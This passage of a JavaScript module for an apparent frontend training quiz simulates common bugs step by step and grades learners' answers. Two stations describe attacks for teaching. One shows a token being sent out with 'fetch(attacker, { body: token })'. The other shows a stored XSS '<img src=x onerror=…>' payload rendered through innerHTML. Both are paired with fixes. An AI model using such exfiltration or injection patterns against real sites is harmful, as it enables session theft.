      { label: 'fixed path', detail: 'deps [orders, threshold] → recomputes on prop change' },
    ],
    outcome: {
      summary: 'stale list rendered — memo never recomputed',
      stale: true,
      metric: 'dep arrays must name every value read inside',
    },
  };
}

function simulateAbortFetch() {
  return {
    steps: [
      { label: 'type "a"', detail: 'effect #1 fires → request r1 in flight' },
      { label: 'type "ab"', detail: 'effect #2 fires → request r2 in flight (r1 not cancelled)' },
      { label: 'r2 resolves', detail: 'setResults(rows for "ab") — correct, briefly' },
      { label: 'r1 resolves late', detail: 'setResults(rows for "a") — stale overwrite wins' },
      { label: 'with abort', detail: 'cleanup aborts r1 when effect #2 starts — r1 can never resolve' },
    ],
    outcome: {
      summary: 'last-resolved wins, not last-sent',
      winner: 'r1 (stale)',
      metric: 'last write wins — and "last" means last to resolve',
    },
  };
}

function simulateTimezone() {
  // '2026-10-05' parses as UTC midnight; New York (UTC-4) is still Oct 4.
  return {
    steps: [
      { label: 'parse', detail: 'new Date("2026-10-05") → 2026-10-05T00:00:00Z (UTC midnight)' },
      { label: 'render in UTC-4', detail: 'same instant is 2026-10-04 20:00 local' },
      { label: 'label', detail: 'toLocaleDateString → "10/4/2026" — a day early' },
      { label: 'fixed path', detail: 'new Date(2026, 9, 5) → local midnight → "10/5/2026" always' },
    ],
    outcome: {
      summary: 'label shows Oct 4 — off by one day',
      parsedAs: '2026-10-05T00:00:00Z',
      renderedAs: '10/4/2026 (UTC-4)',
      metric: 'date-only strings parse as UTC — instant ≠ calendar date',
    },
  };
}

function simulateFocusTrap() {
  return {
    steps: [
      { label: 'modal opens', detail: 'focus stays on the trigger (or wherever it was) — nothing moved it' },
      { label: 'Tab ×1', detail: 'focus walks to the next link *behind* the overlay' },
      { label: 'Tab ×n', detail: 'focus cycles the whole background page — modal controls never reached' },
      { label: 'Enter', detail: 'activates a background link, not the modal action' },
      { label: 'fixed path', detail: 'focus() into modal on open, trap Tab inside, restore to trigger on close' },
    ],
    outcome: {
      summary: 'focus escapes to the page behind the modal',
      trapped: false,
      metric: 'open + trap + restore — all three or none of it works',
    },
  };
}

function simulateDerivedState() {
  return {
    steps: [
      { label: 'mount', detail: 'useState(items) snapshots prop v1 into rows' },
      { label: 'parent re-render', detail: 'items is now v2 — rows still holds v1' },
      { label: 'render', detail: 'list displays stale rows; props and state have diverged' },
      { label: 'fixed path', detail: 'derive const rows = items during render — one source of truth' },
    ],
    outcome: {
      summary: 'the snapshot survives every prop update',
      stale: true,
      metric: 'useState(prop) is an initializer, not a subscription',
    },
  };
}

function simulateTokenStorage() {
  return {
    steps: [
      { label: 'login', detail: 'server returns { token }; client writes it to localStorage' },
      { label: 'payload lands', detail: 'an injected script runs on the origin (XSS or extension)' },
      { label: 'read', detail: 'localStorage.getItem("jwt") — full token, no barrier' },
      { label: 'exfiltrate', detail: 'fetch(attacker, { body: token }) — session stolen' },
      { label: 'httpOnly path', detail: 'cookie set by server never appears in document.cookie — JS cannot read it' },
    ],
    outcome: {
      summary: 'origin scripts read localStorage — token gone',
      exposed: { localStorage: true, httpOnlyCookie: false },
      metric: 'XSS steals the token; CSRF is the cookie-side trade-off',
    },
  };
}

function simulateXssInner() {
  return {
    steps: [
      { label: 'comment saved', detail: 'body = <img src=x onerror=…> stored as a normal comment' },
      { label: 'innerHTML render', detail: 'string parsed as markup — img element created' },
      { label: 'img fails', detail: 'src=x cannot load → onerror handler fires' },
      { label: 'payload runs', detail: 'attacker code executes in every viewer\'s session' },
      { label: 'textContent path', detail: 'same body rendered as inert text — nothing executes' },
    ],
    outcome: {
      summary: 'stored XSS: one comment, every viewer compromised',
      executes: true,
      metric: 'innerHTML parses; textContent inerts',
    },
  };
}

function simulateIndexKeys() {
  return {
    steps: [
      { label: 'initial list', detail: 'rows keyed 0,1,2 — each Row holds its own draft state' },
      { label: 'delete row 0', detail: 'items shift; React diffs keys 0,1 — same keys, new items' },
      { label: 'reconciliation', detail: 'row keyed 1 keeps its DOM+state but receives former row 0\'s slot' },
      { label: 'result', detail: 'draft typed for item B now displays on item A — state slid sideways' },
      { label: 'stable keys', detail: 'key=item.id → deleting one removes exactly one row+state pair' },
    ],
    outcome: {
      summary: 'drafts inherit the wrong row — silent data corruption',
      corrupt: true,
      metric: 'keys are identity; the index is not an identity',
    },
  };
}

function simulateTsNarrow() {
  return {
    steps: [
      { label: 'signature', detail: 'x: string | number — union of two shapes' },
      { label: 'x.toFixed(2)', detail: 'toFixed exists on number only — compile error on the union' },
      { label: 'narrow', detail: 'typeof x === "number" splits the union inside the block' },
      { label: 'compiles', detail: 'number branch gets toFixed; string branch gets its own path' },
      { label: 'the lazy path', detail: 'x: any compiles everything — and checks nothing' },
    ],
    outcome: {
      summary: 'union members must be narrowed before use',
      compiles: false,
      metric: 'any silences the compiler, not the bug',
    },
  };
}

function simulateThisBinding() {
  return {
    steps: [
      { label: 'assign handler', detail: 'button.onclick = cart.add — the function reference travels alone' },
      { label: 'click', detail: 'browser invokes it as element.onclick() — this = the button element' },
      { label: 'this.items.push', detail: 'button has no items → TypeError (or undefined receiver)' },
      { label: 'cart untouched', detail: 'items stays [] — the method never saw its owner' },
      { label: 'bound path', detail: 'item => cart.add(item) closes over cart — this fixed forever' },
    ],
    outcome: {
      summary: 'this follows the call site, not the definition',
      thisValue: 'HTMLButtonElement (or undefined, strict)',
      metric: 'extracting a method detaches its receiver',
    },
  };
}

function simulateMutateProps() {
  return {
    steps: [
      { label: 'props arrive', detail: 'rows: same array reference the parent owns' },
      { label: 'rows.sort()', detail: 'sorts in place — parent\'s array reordered behind its back' },
      { label: 'same reference', detail: 'a memoized parent sees identical props and skips the re-render' },
      { label: 'result', detail: 'grid stale + sibling components read corrupted order' },
      { label: 'copy first', detail: '[...rows].sort() — parent\'s array untouched, diff sees a new list' },
    ],
    outcome: {
      summary: 'the sort escaped the component — mutation crossed the boundary',
      mutated: true,
      metric: 'sort() mutates; spread or toSorted() copies',
    },
  };
}

function simulateCoercion() {
  return {
    steps: [
      { label: 'API returns count: 0', detail: 'a real value — zero items exist' },
      { label: 'count ? A : B', detail: '0 is falsy → the ternary picks the empty branch' },
      { label: 'render', detail: '"No items" — indistinguishable from data that never arrived' },
      { label: 'fixed path', detail: 'count != null → only null/undefined select the empty state; 0 renders "0 new"' },
    ],
    outcome: {
      summary: 'a real zero rendered as missing data',
      renders: 'Empty state',
      metric: 'falsy ≠ absent — check != null',
    },
  };
}

function simulateAriaLive() {
  return {
    steps: [
      { label: 'save() resolves', detail: 'checkmark icon appears — visual only' },
      { label: 'screen reader', detail: 'no live region exists → silence; did it save?' },
      { label: 'user response', detail: 'presses Save again — duplicate write' },
      { label: 'fixed path', detail: 'aria-live="polite" region updated to "Document saved" → announced' },
    ],
    outcome: {
      summary: 'the outcome was invisible to assistive tech',
      announced: false,
      metric: 'if it isn\'t announced, it didn\'t happen — for part of your audience',
    },
  };
}

const SIMULATORS = {
  'var-loop': simulateVarLoop,
  'stale-effect': simulateStaleEffect,
  'big-table': simulateBigTable,
  'fetch-ok': simulateFetchOk,
  'metric-sort': simulateMetricSort,
  'div-button': simulateDivButton,
  microtasks: simulateMicrotasks,
  'memo-deps': simulateMemoDeps,
  'abort-fetch': simulateAbortFetch,
  timezone: simulateTimezone,
  'focus-trap': simulateFocusTrap,
  'derived-state': simulateDerivedState,
  'token-storage': simulateTokenStorage,
  'xss-inner': simulateXssInner,
  'index-keys': simulateIndexKeys,
  'ts-narrow': simulateTsNarrow,
  'this-binding': simulateThisBinding,
  'mutate-props': simulateMutateProps,
  coercion: simulateCoercion,
  'aria-live': simulateAriaLive,
};

export function simulateStation(id) {
  getStation(id); // validates
  return { station: id, ...SIMULATORS[id]() };
}

export function evaluateAnswer(stationId, choice) {
  const station = getStation(stationId);
  const picked = station.options.find(o => o.id === choice);
  if (!picked) throw new Error(`unknown option "${choice}" for station ${stationId}`);
  return {
    station: stationId,
    choice,
    correct: choice === station.correct,
    pickedLabel: picked.label,
    correctOption: station.options.find(o => o.id === station.correct),
    explanation: station.explanation,
    fix: station.fix,
    rubric: station.rubric,
  };
}

// mm:ss for the timed-run clock. Deterministic, injected ms — no clock read.
export function formatClock(msLeft) {
  const total = Math.max(0, Math.round(msLeft / 1000));
  const m = Math.floor(total / 60);
  const s = total % 60;
  return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
}

// answers: { [stationId]: choiceId } — only answered stations count.
export function gradeSession(answers = {}) {
  let answered = 0;
  let correct = 0;
  for (const station of STATIONS) {
    const choice = answers[station.id];
    if (!choice) continue;
    answered += 1;
    if (choice === station.correct) correct += 1;
  }
  const remaining = STATIONS.length - answered;
  const verdict =
    answered === 0 ? 'no stations attempted' :
    correct === STATIONS.length ? 'assessment-ready: every trace and every trade-off landed' :
    correct >= STATIONS.length - 1 ? 'strong pass — one station to revisit' :
    correct >= STATIONS.length / 2 ? 'passing reasoning; tighten the misses below' :
    'keep tracing — the rubric cards show the reasoning frame';
  return { total: STATIONS.length, answered, correct, remaining, verdict };
}
